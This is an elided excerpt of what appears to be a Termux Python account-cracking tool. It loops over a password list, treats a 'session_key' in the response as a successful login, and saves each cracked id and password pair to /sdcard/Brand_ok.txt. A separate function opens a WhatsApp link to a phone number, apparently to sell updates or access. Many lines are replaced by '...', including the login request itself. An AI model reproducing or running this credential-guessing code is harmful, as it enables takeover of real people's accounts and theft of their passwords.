...
def qsbuy():
        try:
                ...
                if str("upppdate") in update:
                        ...
                        os.system(f"termux-open-url https://wa.me/+8801759916221?text={bumper}")
                        qsbuy()
...
class crack_main():
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        ...
                                        print(' \033[1;32m[BRAND-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/Brand_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
                                else:
                                        continue
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/Brand_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
